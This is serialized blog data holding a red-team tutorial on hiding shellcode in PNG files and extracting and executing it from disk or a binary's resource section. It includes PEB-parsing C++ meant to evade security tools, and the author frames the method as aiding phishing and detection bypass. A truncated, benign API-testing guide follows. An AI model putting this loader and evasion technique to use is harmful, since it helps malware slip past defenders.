🎯&quot;],&quot;filePath&quot;:[0,&quot;src/content/posts/convert-bloodhound-legacy-queries-to-ce.mdx&quot;],&quot;digest&quot;:[0,&quot;fe0373cba7f90eea&quot;],&quot;deferredRender&quot;:[0,true],&quot;collection&quot;:[0,&quot;posts&quot;],&quot;slug&quot;:[0,&quot;convert-bloodhound-legacy-queries-to-ce&quot;],&quot;render&quot;:[0,null],&quot;imageMeta&quot;:[0,{&quot;src&quot;:[0,&quot;/_astro/blood-hound.DWEY7bi5.png&quot;],&quot;width&quot;:[0,1286],&quot;height&quot;:[0,630],&quot;format&quot;:[0,&quot;png&quot;]}],&quot;isSuperseded&quot;:[0,false]}],[0,{&quot;id&quot;:[0,&quot;hide-shellcode-in-images.mdx&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Hiding Shellcode in Images with Python and C/C++&quot;],&quot;date&quot;:[3,&quot;2024-12-17T00:00:00.000Z&quot;],&quot;image&quot;:[0,&quot;heroImages/hiding_shellcode_in_Images.png&quot;],&quot;tags&quot;:[1,[[0,&quot;Python&quot;],[0,&quot;C++&quot;],[0,&quot;Malware&quot;],[0,&quot;Red Team&quot;],[0,&quot;EDR Evasion&quot;],[0,&quot;Cybersecurity&quot;],[0,&quot;Hacking&quot;],[0,&quot;Steganography&quot;],[0,&quot;Payload Hiding&quot;],[0,&quot;Programming&quot;]]],&quot;description&quot;:[0,&quot;Learn how to hide shellcode payloads in plain sight by embedding them into image files, such as PNGs, using Python.&quot;],&quot;featured&quot;:[0,2],&quot;repo&quot;:[0,&quot;andrecrafts/hide-payload-in-images&quot;],&quot;stars&quot;:[0,191],&quot;projectSlug&quot;:[0,&quot;andrecrafts/hide-payload-in-images&quot;]}],&quot;body&quot;:[0,&quot;import Image from &#39;src/components/ImageLocal.astro&#39;;\nimport Video from &#39;src/components/VideoLocal.astro&#39;;\n\n\n## Introduction\n\nIn this post, I will demonstrate how to hide a shellcode payload in an image file using Python and retrieve it using C/C++. I will use **PNG files** as an example.\n\nPNG files use an **IEND chunk** to mark the end of image data. Any bytes appended *after* this chunk do not affect the file&#39;s integrity or visual appearance, making it possible to hide payloads.\n\nThis technique leverages `end-of-file` markers, allowing data to be hidden in any image format with a similar structure, not just PNG files.\n\nWith this method, you can hide encrypted shellcode for discreet payload execution or secretly store sensitive information, such as a list of passwords, without altering the image&#39;s appearance.\n\nThis approach makes it easier to bypass security tools and harder for phishing campaigns to be detected.\n\n### Project Demo\n\n&lt;Video src=\&quot;hide_payload_updated.mp4\&quot; frameborder=\&quot;0\&quot; loop={true} muted={true} /&gt;\n\n## Support\n\nEnjoying my content? Show your support by sharing, liking, or leaving a comment!\n\nYou can also support me on buy me a ko-fi to fuel more awesome content:\n\n[![Buy me a KO-FI](https://img.shields.io/badge/-Buy%20me%20a%20KOFI-FF5F1D?style=for-the-badge&amp;logo=KO-FI&amp;logoColor=fff)](https://ko-fi.com/wafflesexploits)\n\n## How to Hide a payload in a Image\n\nAs mentioned earlier, PNG files use an **IEND chunk** to mark the end of image data. Any bytes appended *after* this chunk do not affect the image&#39;s integrity or visual appearance, making it a perfect spot to hide payloads.\n\nA simple way to do this is by using the `cat` command:\n\n```bash\ncat payload.bin &gt;&gt; image.png\n```\n\nThis appends the payload&#39;s bytes to the end of the image file. However, I wanted a cross-platform solution using Python, so I wrote a script called **`payload-embedder.py`**.\n\n**View the code in GitHub: [payload-embedder.py](https://github.com/WafflesExploits/hide-payload-in-images/blob/main/code/payload-embedder.py)**\n\nWith this script, you can easily embed shellcode into an image file like this:\n\n- &lt;Image src=\&quot;images/15d0136327bf4ca787447ac5d837944d.png\&quot; alt=\&quot;6cdd406d49bf9692d2e10ee5df85f9b4.png\&quot; width=\&quot;509\&quot; height=\&quot;99\&quot; /&gt;\n\nAs expected, the resulting `embedded.png` looks exactly the same as the original image:\n\n- &lt;Image src=\&quot;images/efd966852f0142e48cecfa0e9e7dd7f6.png\&quot; alt=\&quot;541d2914cb505c67d1b3a60232eb997d.png\&quot; width=\&quot;250\&quot; height=\&quot;112\&quot; /&gt;\n\nIf you want to use this in practice, you can hide encrypted shellcode in image files and later extract it when needed.\n\nThere are **two methods** to retrieve the payload:\n\n1. [From Disk:](#fetch-payload-from-disk-via-c)\n    - Store the image file on disk and extract the payload bytes directly from the file.\n2. [From Resources Section (.rsrc):](#store-the-image-file-in-the-resources-section-rsrc-of-a-binary-file)\n    - Store the image file in the resources section of a binary file and Extract the payload from there.\n\n## Fetch payload from Disk via C++\n\nOnce we embed a payload into an image file, the next step is to extract it. The code below, written in **C/C++**, demonstrates how to retrieve the payload bytes from the end of an image file stored on disk.\n\nThis program assumes that you know the size of the original image file. By comparing the size of the modified image file (with the payload) and the original size, we can determine the exact location and size of the payload.\n\n**View the code in GitHub:** [payload-extractor-from-file.cpp](https://github.com/WafflesExploits/hide-payload-in-images/blob/main/code/payload-extractor/payload-extractor-from-file/payload-extractor-from-file.cpp)\n\n\nThis code is split into three main parts:\n\n1.  [**Constants in Code**](#constants-in-code)\n2.  [**Payload Extraction**](#payload-extraction)\n3.  [**Executing the Payload**](#executing-the-payload)\n\n\n### Constants in Code\n\nBefore running the code, there are two constants you need to configure:\n\n1.  **Original File Size** (`ORIGINAL_FILE_SIZE`):\n    - You can obtain the original file size from the output of the **Python script** [payload-embedder.py](https://github.com/WafflesExploits/hide-payload-in-images/blob/main/code/payload-embedder.py) when embedding the payload into the image file.\n    - This value represents the size of the image file *before* the payload was appended.\n2.  **Target File Path** (`TARGET_FILE_PATH`):\n    - This constant specifies the path to the modified image file containing the hidden payload.\n\n### Payload Extraction\n\nThe extraction process is handled by the `extract_payload()` function. Here&#39;s how it works step by step:\n\n1.  **Retrieve the File Size:**\n    - The function calls `get_file_size()` to obtain the size of the target image file. This helps validate that the payload exists and gives us the total file size.\n2.  **Calculate the Payload Size:**\n    - The size of the payload is determined by subtracting the **original file size** from the **modified file size**.\n3.  **Seek to the Payload Location:**\n    - Using `fseek`, the program moves the file pointer to the position where the payload starts, which is right after the original image data.\n4.  **Read the Payload:**\n    - The payload bytes are read into a dynamically allocated buffer using `fread()`. This ensures we have the extracted payload stored in memory for further use.\n\n\n### Executing the Payload\n\nThe execution process is handled by the `ExecutePayloadViaCallback()` function, which performs the following steps:\n\n1.  **Allocate Executable Memory:**\n    - The program uses `VirtualAlloc` to allocate a block of memory that is both readable and executable. This memory is where the payload (shellcode) will be stored.\n2.  **Copy the Payload:**\n    - The extracted payload is copied into the allocated memory using `memcpy`.\n3.  **Execute the Payload:**\n    - The `SetTimer` API is used to execute the payload via a **callback function**. This approach is clean and effective for executing shellcode\n    - You can view a list of callback functions for payload execution by aahmad097 here:\n        - [aahmad097/AlternativeShellcodeExec](https://github.com/aahmad097/AlternativeShellcodeExec)\n4.  **Free Allocated Memory:**\n    - After execution, the memory allocated for the payload is released using `VirtualFree` to prevent memory leaks.\n\n## Store the Image file in the resources section (.rsrc) of a binary file\n\nIn this section, I&#39;ll show you how to embed an image file (or any payload) into the **resources section (.rsrc)** of a binary file using Visual Studio. I&#39;ll also explain how to find the image file&#39;s **Resource ID** and **Resource Type**, which are essential for accessing and extracting the payload programmatically later.\n\n1.  [How to store a image file in the .rsrc section.](#how-to-store-a-image-file-in-the-rsrc-section)\n2.  [Finding the Resource file ID and Type](#finding-the-resource-file-id-and-type)\n\n### How to store a image file in the `.rsrc` section.\n\nFollow these steps to embed your image file into the resources section:\n\n1.  Inside Visual Studio, right-click on `&#39;Resource files&#39;`.\n2.  Click `Add &gt; New &gt; Show all Templates` Item.\n    - &lt;Image src=\&quot;images/83d1a31fc55d49da94c3c51ef1ca5843.png\&quot; alt=\&quot;4d2e8fca2ef152ba1cb3d6bcaa3d8393.png\&quot; width=\&quot;294\&quot; height=\&quot;73\&quot; /&gt;\n3.  Go to `&#39;Resource&#39;`, and select `&#39;Resource File .rc&#39;`.\n4.  This will generate a new sidebar, the `Resource View`.\n5.  Right-click on the `.rc` file (`Resource.rc` is the default name).\n6.  Select the `&#39;Add Resource&#39;` option.\n    - &lt;Image src=\&quot;images/6af25ec10208402390df3d03fe1be930.png\&quot; alt=\&quot;42cbe1aaba73ce0b1d64ab8f88738a90.png\&quot; width=\&quot;189\&quot; height=\&quot;193\&quot; /&gt;\n7.  Click `&#39;Import&#39;`.\n8.  Select your Embedded Image file:\n    - &lt;Image src=\&quot;images/d1cc0ea2d5184abf88fee318ce9b1dc9.png\&quot; alt=\&quot;11b4ed96bfe4487212a38c0ca7aa0d6c.png\&quot; width=\&quot;202\&quot; height=\&quot;151\&quot; /&gt;\n9.  You should see a new file that represents your Image file.\n    - &lt;Image src=\&quot;images/069f23373f874d48932fa38996f10ff4.png\&quot; alt=\&quot;76ad25e3c7177af91036e66e2db5a0e9.png\&quot; scale=\&quot;1\&quot; quality=\&quot;high\&quot; /&gt;\n    - In this case, `IDB_PNG1` is the Resource name of my Image file.\n\n### Finding the Resource file ID and Type\n\nTo access your image file via code, you need to find its Resource ID and Type.\n\nTo access the image file programmatically, you need two key pieces of information:\n\n1.  [**Resource ID**](#to-find-the-resource-id-you-need-to)\n2.  [**Resource Type**](#to-find-the-resource-type-you-need-to)\n\n#### To find the Resource ID you need to:\n1.  The **Resource ID** is defined as a macro named after your image file&#39;s resource name.\n2.  This macro is located in the `resource.h` file. Open `resource.h` to see the Resource ID:\n    - In my case, the Image file&#39;s Resource name was `IDB_PNG1`.\n    - &lt;Image src=\&quot;images/23396645d7314ec3bd8a876f3c355940.png\&quot; alt=\&quot;23396645d7314ec3bd8a876f3c355940.png\&quot; width=\&quot;569\&quot; height=\&quot;93\&quot; /&gt;\n\n#### To find the Resource Type you need to:\n1.  Go to your Project and Open the `Solution Explorer` window.\n2.  Right-click on `Resource.rc`, Select `Open with...` and Select `C++ Source Code Editor (with Encoding)`.\n    - &lt;Image src=\&quot;images/8d53195f43b04a78ad7def35e8603e30.png\&quot; alt=\&quot;5afb55350199657bd350f67a2faa62b1.png\&quot; width=\&quot;185\&quot; height=\&quot;156\&quot; /&gt;\n3.  With the `Resource.rc` tab open, Search by your Image file&#39;s Resource name by pressing `CTRL+F` to open.\n4.  You should see the Image file&#39;s Resource Type after the Resource name, as shown below:\n    - &lt;Image src=\&quot;images/b25260fc3edf45749f6c0e78c3c0ec62.png\&quot; alt=\&quot;a6d111804abd7b098b6a2f424d2b6d90.png\&quot; width=\&quot;512\&quot; height=\&quot;123\&quot; /&gt;\n\n## Fetch Payload from Resources via WinAPI\n\nAfter [storing the modified image file (containing the payload) into the **resources section** of a binary file](#store-the-image-file-in-the-resources-section-rsrc-of-a-binary-file), the next step is to extract and execute it. The code below, written in **C/C++**, demonstrates how to achieve this.\n\nThis code works similarly to the previous example of extracting a payload from a Image file on disk. The key difference lies in the **Payload Extraction**, which retrieves the payload directly from the **resources section** instead of a file.\n\n**View the code in GitHub:** [payload-extractor-from-resource.cpp](https://github.com/WafflesExploits/hide-payload-in-images/blob/main/code/payload-extractor/payload-extractor-from-resource/payload-extractor-from-resource.cpp)\n\nThis code is split into three main parts:\n\n1.  [**Constants in Code**](#constants-in-code-1)\n2.  [**Payload Extraction**](#payload-extraction-1)\n3.  **Executing the Payload**\n    1.  This part is the same as extracting a payload from an image file on disk. If you want to learn more about it, visit the [Extract the payload from a Image file on disk using C/C++](#extract-the-payload-from-a-image-file-on-disk-using-cc) section.\n\n### Constants in Code\n\nBefore running the code, there are three constants that you need to set:\n\n1.  **Original File Size (`ORIGINAL_FILE_SIZE`)**:\n    - You can get the original file size from the output of the **Python script** [payload-embedder.py](https://github.com/WafflesExploits/hide-payload-in-images/blob/main/code/payload-embedder.py) when you embed the payload into the image file.\n    - This value represents the exact size of the original image before the payload was appended.\n2.  **Resource ID (`PAYLOAD_RESOURCE_ID`)**:\n    - The Resource ID identifies your embedded image file in the resource section.\n    - To find this value, refer to the **[Finding the Resource File ID and Type](#finding-the-resource-file-id-and-type)** section.\n3.  **Resource Type (`PAYLOAD_RESOURCE_TYPE`)**:\n    - The Resource Type specifies the type of resource (e.g., `PNG`).\n    - This can also be found in the **[Finding the Resource File ID and Type](#finding-the-resource-file-id-and-type)** section.\n\n### Payload Extraction\n\nThe `extract_payload_from_resource()` function is responsible for retrieving the hidden payload directly from the binary&#39;s resources.\n\nHere&#39;s how it works step by step:\n\n1.  **Find the Resource:**\n    - The function uses `FindResourceW()` to locate the resource by its **ID** (e.g., `IDB_PNG1`) and **type** (e.g., `PNG`).\n2.  **Load and Lock the Resource:**\n    - `LoadResource()` loads the resource into memory, and `LockResource()` locks it to ensure safe access to its data.\n3.  **Calculate the Payload Size:**\n    - The total resource size is determined using `SizeofResource()`.\n    - The payload size is then calculated by subtracting the **original file size** from the total resource size.\n4.  **Extract the Payload Bytes:**\n    - Using `memcpy`, the function extracts the payload bytes starting from the offset where the original file ends.\n\n## Fetch Payload from Resources via PEB\n\nAfter [storing the modified image file (containing the payload) into the **resources section** of a binary file](#store-the-image-file-in-the-resources-section-rsrc-of-a-binary-file), the next step is to extract and execute it. \n\nIn this section, I&#39;ll show you how to achieve this without relying on WinAPI functions. \n\nInstead, we&#39;ll manually parse the Process Environment Block (PEB) and PE headers to locate and retrieve the image file and its hidden payload.\n\nThis approach is stealthier and more versatile, as it avoids direct use of WinAPI functions like `FindResource` and `LockResource`, making it harder for security tools to detect.\n\n**View the code in GitHub:** [payload-extractor-from-resource-via-peb.cpp](https://github.com/WafflesExploits/hide-payload-in-images/blob/main/code/payload-extractor/payload-extractor-from-rsrc-via-peb/payload-extractor-from-rsrc-via-peb.cpp)\n\nThis code is split into three main parts:\n\n1.  [**Constants in Code**](#constants-in-code-1)\n2.  [**Payload Extraction via PEB Parsing**](#payload-extraction-via-peb-parsing)\n3.  **Executing the Payload**\n    1.  This part is the same as extracting a payload from an image file on disk. If you want to learn more about it, visit the [Extract the payload from a Image file on disk using C/C++](#extract-the-payload-from-a-image-file-on-disk-using-cc) section.\n\n### Constants in Code\n\nBefore running the code, there are three constants that you need to set:\n\n1.  **Original File Size (`ORIGINAL_FILE_SIZE`)**:\n    - You can get the original file size from the output of the **Python script** [payload-embedder.py](https://github.com/WafflesExploits/hide-payload-in-images/blob/main/code/payload-embedder.py) when you embed the payload into the image file.\n    - This value represents the exact size of the original image before the payload was appended.\n2.  **Resource ID (`PAYLOAD_RESOURCE_ID`)**:\n    - The Resource ID identifies your embedded image file in the resource section.\n    - To find this value, refer to the **[Finding the Resource File ID and Type](#finding-the-resource-file-id-and-type)** section.\n3.  **Resource Type (`PAYLOAD_RESOURCE_TYPE`)**:\n    - The Resource Type specifies the type of resource (e.g., `PNG`).\n    - This can also be found in the **[Finding the Resource File ID and Type](#finding-the-resource-file-id-and-type)** section.\n\n### Payload Extraction via PEB Parsing\n\nThe `extract_payload_from_resource_via_peb()` function is responsible for retrieving the hidden payload directly from the binary&#39;s resources without using WinAPI functions. Here&#39;s how it works step by step:\n\n1.  **Retrieves the Module Handle:**\n    - The function uses [hGetCurrentModuleHandle()](#hgetcurrentmodulehandle) to get the handle of the current module by accessing the Process Environment Block (PEB) directly.\n    - This avoids using `GetModuleHandle` or similar WinAPI calls.\n2.  **Fetches Resource Data:**\n    - It calls [GetResourceData()](#getresourcedata) to manually parse the PE headers, locate the resource directory, and extract the raw resource data and its size.\n    - This function avoids using WinAPI functions like `FindResource` and `LockResource`.\n3.  **Calculates Payload Size:**\n    - The total resource size is determined, and the payload size is calculated by subtracting the **original file size** from the total resource size.\n4.  **Extracts the Payload Bytes:**\n    - Using `memcpy`, the function extracts the payload bytes starting from the offset where the original file ends.\n5.  **Stores the Payload:**\n    - The extracted payload and its size are stored in the provided pointers for further use.\n\n### hGetCurrentModuleHandle\n\n```cpp\n/**\n * @brief Retrieves the handle of the current module via PEB using architecture-appropriate instructions (x86/x64), avoiding memory walking for reliability.\n * \n * @return HMODULE Always returns the base address of the current module via the PEB&#39;s ImageBaseAddress field.\n */\nHMODULE hGetCurrentModuleHandle() {\n    // Retrieve the PEB pointer using the appropriate method for x86/x64\n#ifdef _WIN64\n    PPEB pPeb = (PPEB)__readgsqword(0x60);\n#else\n    PPEB pPeb = (PPEB)__readfsdword(0x30);\n#endif\n\n    // Return the image base address stored in the PEB\n    return (HMODULE)pPeb-&gt;ImageBaseAddress;\n}\n```\n**Here&#39;s how it works:**\n\n1. **Retrieves the PEB Pointer**:\n    - The function uses architecture-specific instructions to access the Process Environment Block (PEB):\n        - On x64 systems, it uses __readgsqword to access the PEB from the GS segment.\n        - On x86 systems, it uses __readfsdword to access the PEB from the FS segment.\n2. **Accesses the ImageBaseAddress Field**:\n    - The PEB contains the ImageBaseAddress field, which stores the base address of the current module.\n3. **Returns the Module Handle**:\n    - The function returns the ImageBaseAddress as the module handle, ensuring correct retrieval regardless of compiler optimizations.\n\n**Note:** This is an updated version of the function.\n\nThe original implementation of hGetCurrentModuleHandle walked backward through memory to locate the DOS and PE headers.\nWhile this method worked in some cases, it was unreliable and prone to crashes due to invalid memory access, especially in unoptimized builds or when encountering unexpected memory layouts. \nThe updated version directly accesses the PEB, which is a safer and more reliable approach, as the PEB always contains the correct module base address.\n\n### GetResourceData\n\n```cpp\n/**\n * @brief Fetches raw data and size for a specified resource from the current module.\n *\n * @param hModule Handle to the module containing the resource.\n * @param ResourceId ID of the resource to fetch.\n * @param ppResourceRawData Pointer to a pointer where the raw resource data will be stored.\n * @param psResourceDataSize Pointer to a DWORD where the resource data size will be stored.\n * @return BOOL TRUE if the resource data is successfully fetched, FALSE otherwise.\n */\nBOOL GetResourceData(HMODULE hModule, WORD ResourceId, PVOID* ppResourceRawData, PDWORD psResourceDataSize) {\n    CHAR* pBaseAddr = (CHAR*)hModule;\n\n    // Parse the DOS header to locate the PE headers\n    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBaseAddr;\n    PIMAGE_NT_HEADERS pImgNTHdr = (PIMAGE_NT_HEADERS)(pBaseAddr + pImgDosHdr-&gt;e_lfanew);\n    PIMAGE_OPTIONAL_HEADER pImgOptionalHdr = (PIMAGE_OPTIONAL_HEADER)&amp;pImgNTHdr-&gt;OptionalHeader;\n\n    // Locate the resource directory from the PE optional header\n    PIMAGE_DATA_DIRECTORY pDataDir = &amp;pImgOptionalHdr-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE];\n    PIMAGE_RESOURCE_DIRECTORY pResourceDir = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir-&gt;VirtualAddress);\n    PIMAGE_RESOURCE_DIRECTORY_ENTRY pResourceEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir + 1);\n\n    // Iterate through the resource directory entries\n    for (size_t i = 0; i &lt; (pResourceDir-&gt;NumberOfNamedEntries + pResourceDir-&gt;NumberOfIdEntries); i++) {\n        if (pResourceEntry[i].DataIsDirectory == 0)\n            break;\n\n        // Locate the second-level resource directory\n        PIMAGE_RESOURCE_DIRECTORY pResourceDir2 = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir-&gt;VirtualAddress + (pResourceEntry[i].OffsetToDirectory &amp; 0x7FFFFFFF));\n        PIMAGE_RESOURCE_DIRECTORY_ENTRY pResourceEntry2 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir2 + 1);\n\n        // Check if the second-level entry matches the requested resource ID\n        if (pResourceEntry2-&gt;DataIsDirectory == 1 &amp;&amp; pResourceEntry2-&gt;Id == ResourceId) {\n            // Locate the third-level resource directory\n            PIMAGE_RESOURCE_DIRECTORY pResourceDir3 = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir-&gt;VirtualAddress + (pResourceEntry2-&gt;OffsetToDirectory &amp; 0x7FFFFFFF));\n            PIMAGE_RESOURCE_DIRECTORY_ENTRY pResourceEntry3 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir3 + 1);\n\n            // Retrieve the resource data entry\n            PIMAGE_RESOURCE_DATA_ENTRY pResource = (PIMAGE_RESOURCE_DATA_ENTRY)(pBaseAddr + pDataDir-&gt;VirtualAddress + (pResourceEntry3-&gt;OffsetToData &amp; 0x7FFFFFFF));\n\n            // Store the raw resource data and its size\n            *ppResourceRawData = (PVOID)(pBaseAddr + pResource-&gt;OffsetToData);\n            *psResourceDataSize = pResource-&gt;Size;\n\n            return TRUE;\n        }\n    }\n\n    return FALSE;\n}\n```\n\n**Here&#39;s how it works:**\n\n1.  **Parses the PE Headers**:\n    - The function starts by parsing the DOS header to locate the PE headers.\n2.  **Locates the Resource Directory**:\n    - It uses the `DataDirectory` array in the optional header to find the resource section&#39;s virtual address.\n3.  **Iterates Through Resource Entries**:\n    - It iterates through the resource directory entries, comparing the `ResourceId` to find the matching resource.\n4.  **Extracts Resource Data**:\n    - Once the resource is found, it retrieves the raw data and size from the resource data entry.\n5.  **Stores the Result**:\n    - The raw resource data and size are stored in the provided pointers for further use.&quot;],&quot;filePath&quot;:[0,&quot;src/content/posts/hide-shellcode-in-images.mdx&quot;],&quot;digest&quot;:[0,&quot;2eb560d7ba1de346&quot;],&quot;deferredRender&quot;:[0,true],&quot;collection&quot;:[0,&quot;posts&quot;],&quot;slug&quot;:[0,&quot;hide-shellcode-in-images&quot;],&quot;render&quot;:[0,null],&quot;imageMeta&quot;:[0,{&quot;src&quot;:[0,&quot;/_astro/hiding_shellcode_in_Images.DZ1-0QCA.png&quot;],&quot;width&quot;:[0,1286],&quot;height&quot;:[0,630],&quot;format&quot;:[0,&quot;png&quot;]}],&quot;isSuperseded&quot;:[0,false]}],[0,{&quot;id&quot;:[0,&quot;api-testing-insomnia-burp-suite.mdx&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;API Testing with Insomnia &amp; Burp Suite: Secure Alternative to Postman&quot;],&quot;date&quot;:[3,&quot;2024-12-11T00:00:00.000Z&quot;],&quot;image&quot;:[0,&quot;heroImages/api_testing_with_insomnia_burp_suite.png&quot;],&quot;tags&quot;:[1,[[0,&quot;API Testing&quot;],[0,&quot;Web Pentest&quot;],[0,&quot;Red Team&quot;],[0,&quot;Penetration Testing&quot;],[0,&quot;Cybersecurity&quot;],[0,&quot;Improper Asset Management&quot;],[0,&quot;API Security&quot;]]],&quot;description&quot;:[0,&quot;Learn how to use Insomnia and Burp Suite for API testing as a powerful alternative to Postman. Learn how to detect improper asset management vulnerabilities.&quot;],&quot;featured&quot;:[0,0],&quot;projectSlug&quot;:[0]}],&quot;body&quot;:[0,&quot;import Image from &#39;src/components/ImageLocal.astro&#39;;\nimport Video from &#39;src/components/VideoLocal.astro&#39;;\n\n## Introduction\n\nIn this blog post, I&#39;ll show you how to use Insomnia and Burp Suite for API testing and hacking as an alternative to Postman.\n\nYou&#39;ll learn how to set up Insomnia, capture API requests with `mitmproxy`, and convert them to OpenAPI 3.0 format using `mitmproxy2swagger` for easy import into tools like Insomnia or Postman.\n\nI&#39;ll walk you through Insomnia&#39;s features, like managing variables, organizing requests, and integrating with Burp Suite to intercept and modify requests.\n\nFinally, I&#39;ll show you how to test for Improper Asset Management (public or outdated API versions) using Insomnia with Burp Suite&#39;s match-and-replace rules to detect outdated endpoints.\n\nI created this guide because I needed an alternative to Postman, which lacks local storage for collections. Insomnia proved to be the great choice with its intuitive UI, powerful features, and the ability to store collections locally, making it ideal for testing sensitive APIs.\n\nThis blog post was created because I was doing the [API Penetration Test course](https://www.apisecuniversity.com/courses/api-penetration-testing). I highly recommend it, it&#39;s a great material and completely free!\n\n## Support\nEnjoying my content? Show your support by sharing, liking, or leaving a comment!\nYou can also buy me a waffle to fuel more awesome content:\n\n&lt;a target=\&quot;_blank\&quot; href=\&quot;https://ko-fi.com/wafflesexploits\&quot; class=\&quot;img-link\&quot;&gt;&lt;img src=\&quot;https://img.shields.io/badge/-🧇 Buy me a Waffles-gold?style=for-the-badge\&quot; alt=\&quot;Buy me a kofi Badge\&quot; loading=\&quot;lazy\&quot; /&gt;&lt;/a&gt;\n\n## Pre-requisites\n\nFor this blog post you will need:\n\n- [Burp Suite Community/Pro](https://portswigger.net/burp)\n- [mitmweb](https://mitmproxy.org/)\n    - Comes pre-installed in Kali Linux.\n    - [Fix common mitmweb/mitmproxy error](#fix-common-mitmwebmitmproxy-error)\n- [Insomnia](https://insomnia.rest/)\n    - Follow this: [Installing Insomnia](#installing-insomnia)\n- [mitmproxy2swagger](https://github.com/alufers/mitmproxy2swagger)\n    - Follow this: [Installing mitmproxy2swagger](#installing-mitmproxy2swagger)\n- [Proxyfoxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/), or any Proxy tool extension for your browser.\n    - Install via your browser&#39;s extensions store.\n\n### Installing Insomnia\n\n1.  Go to https://insomnia.rest/download, and click on \&quot;Download Insomnia for Ubuntu\&quot;.\n    - This should download a `.deb` file.\n2.  Open a terminal, cd into the directory where the `.deb` file is located.\n3.  Install insomnia with the command below:\n    ```bash\n    sudo apt install ./Insomnia.Core-10.2.0.deb\n    ```\n4.  If you encounter an error like this during installation:\n    ```text\n    Download is performed unsandboxed as root as file &#39;/home/kali/Downloads/Insomnia.Core-10.2.0.deb&#39; couldn&#39;t be accessed by user &#39;_apt&#39;. - pkgAcquire::Run (13: Permission denied)\n    ```\n5.  This is a non-fatal warning. It occurs because the `_apt` user does not have permission to access the directory where the `.deb` file is located.\n6.  A quick solution is to move the `.deb` file into a location accessible by `_apt`, such as `/tmp`, and then install it from there:\n    ```bash\n    mv ./Insomnia.Core-10.2.0.deb /tmp/\n    sudo apt install /tmp/Insomnia.Core-10.2.0.deb\n    ```\n### Installing mitmproxy2swagger\n\n`mitmproxy2swagger` converts all recorded requests into the OpenAPI 3.0 format with auto-generated documentation, making them ready for use in tools like Insomnia.\n\nRun the commands below to install it:\n\n```bash\ngit clone https://github.com/alufers/mitmproxy2swagger.git\ncd mitmproxy2swagger\npython3 -m venv mitmproxy_venv\nsource mitmproxy_venv/bin/activate\npip install .\n```\n\nThe commands above create a Python virtual environment with all the dependencies required for `mitmproxy2swagger` to run.\n\nMake sure to activate this environment using the `source mitmproxy_venv/bin/activate` command each time you want to use `mitmproxy2swagger`.\n\n### Fix common mitmweb/mitmproxy error\n\n1.  If you encounter the error:\n    - `module &#39;bcrypt&#39; has no attribute &#39;__about__&#39;`.\n2.  You can fix this by installing `mitmproxy` using `pipx` like so:\n    \n```bash\n# Install mitmproxy\npipx install mitmproxy;\n# Send mitmproxy&#39;s links to /usr/bin/\nsudo mv ~/.local/bin/mitmproxy /usr/bin/mitmproxy;\nsudo mv ~/.local/bin/mitmweb /usr/bin/mitmweb;\nsudo mv ~/.local/bin/mitmdump /usr/bin/mitmdump;\n```\n\n## Capturing and Converting API Requests to OpenAPI 3.0\n\nIn this section, I will guide you through recording API requests using mitmweb and converting them into an OpenAPI 3.0 `spec.yml` file with mitmproxy2swagger. This allows you to import the requests into any API testing tool, such as Insomnia.\n\nFollow this steps:\n\n1.  [Setup mitmweb proxy listener](#setup-mitmweb-proxy-listener)\n2.  [Configure FoxyProxy for mitmweb](#configure-foxyproxy-for-mitmweb)\n3.  [Install the mitmweb certificates](#install-the-mitmweb-certificates)\n4.  [Record API Request and Generating OpenAPI Spec File](#record-api-request-and-generating-openapi-spec-file)\n\n### Setup mitmweb proxy listener\n\nIn this section, we&#39;ll configure the `mitmweb` proxy listener to intercept and forward all API requests through Burp Suite. This setup ensures all requests are sent to Burp Suite, avoiding the need to retest your application later on.\n\nFollow these steps to get started:\n\n1.  Set Burp Suite Proxy to an Alternate Port\n    - Change the Burp Suite proxy port to any number other than `8080/8081`, for example, `127.0.0.1:8083`.\n    - This ensures there are no conflicts with the default ports used by `mitmweb`.\n    - &lt;Image src=\&quot;images/c4881582945a49c7bf83a46a94441213.png\&quot; alt=\&quot;857b2652526813be312472fcd4fbd533.png\&quot; width=\&quot;462\&quot; height=\&quot;251\&quot; /&gt;\n2.  Start Proxying Web Traffic with `mitmweb`\n    - Run the following command to start `mitmweb`:\n    - `mitmweb --mode upstream:https://127.0.0.1:8083`\n    - The `upstream` mode directs all traffic through Burp Suite.\n    - By default, `mitmweb` creates a proxy listener on port `8080` and opens a monitoring interface on port `8081`.\n3.  If you got the error:\n    - `module &#39;bcrypt&#39; has no attribute &#39;_about_&#39;`\n    - Learn how to fix it here: [Fix common mitmweb/mitmproxy error](#fix-common-mitmwebmitmproxy-error)\n        \n\n### Configure FoxyProxy for mitmweb\n\n1.  Access FoxyProxy Settings\n    - Open the `FoxyProxy` extension and select `Options`\n2.  Add a New Proxy\n    - Navigate to the `Proxies` tab, click `Add`, and input the proxy details as shown below:\n    - &lt;Image src=\&quot;images/d0af49207f754c038fcefdabf87c6dcd.png\&quot; alt=\&quot;f1ec8639d3812b23b9e4f0ca7a447828.png\&quot; width=\&quot;367\&quot; height=\&quot;136\&quot; /&gt;\n3.  Enable the mitmweb Proxy\n    - Go back to the `FoxyProxy` extension and select the `mitmweb` proxy you just created to start routing traffic through it.\n    - &lt;Image src=\&quot;images/0b99fba95c304ba5bdf278bf68b29b06.png\&quot; alt=\&quot;f881bbb10a019f3c2406717fbbf142b3.png\&quot; width=\&quot;114\&quot; height=\&quot;150\&quot; /&gt;\n\n### Install the mitmweb certificates\n\nTo enable `mitmweb` to intercept HTTPS traffic, you need to install its root certificates. Follow these steps:\n\n1.  On the `mitmweb` page, Go to `File /&gt; Install Certificates`  \n    - &lt;Image src=\&quot;images/8d2043535d414152944dce1ec2db706a.png\&quot; alt=\&quot;34bc786c409540e92613ff7dddc6ef4e.png\&quot; width=\&quot;95\&quot; height=\&quot;105\&quot; /&gt;\n2.  On this new page, Download the certificates based on your OS.\n    - &lt;Image 